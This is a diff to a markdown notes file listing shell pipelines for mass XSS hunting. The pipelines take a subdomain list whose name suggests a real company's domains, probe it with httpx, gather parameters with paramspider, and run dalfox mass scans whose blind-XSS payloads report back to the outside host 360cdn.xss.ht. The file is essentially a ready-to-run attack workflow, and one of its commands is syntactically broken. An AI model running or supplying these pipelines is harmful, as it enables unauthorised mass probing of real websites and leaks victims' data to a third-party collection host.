@@ -169,7 +169,13 @@ cat all_jd_sub_domain.txt|deduplicate|httpx -status-code -mc 200,301 -silent| aw
 
 cat src.txt| xargs -I {} | &&  cat ./src/*.txt | deduplicate --hide-images --sort | sed '1,4d'|httpx -status-code -mc 200 -silent | awk '{print $1}' >  src_url.txt && python3 removeDepeat.py && cat remove_src_url.txt | dalfox pipe --mass-worker 50 -b 360cdn.xss.ht  -o final_xss.txt
 
+xargs -P 3 -I {} paramspider --domain {}  -s TRUE -e js,css,woff,ttf,svg,png,gif,jpg,PNG,apk,mp4,mp3,jpeg --output ./src/{}.txt
 dalfox file 200_all_url.txt --mass-worker 50 -b 360cdn.xss.ht  -o final_xss.txt
+
+
+dalfox pipe --mass-worker 50 -b 360cdn.xss.ht  -o final_xss.txt
+dalfox file all_url.txt --mass-worker 50 -b 360cdn.xss.ht  --deep-domxss   -o final_xss.txt
+dalfox file all_url.txt --mass-worker 50 -b 360cdn.xss.ht  -o final_xss.txt
 ```
 
 
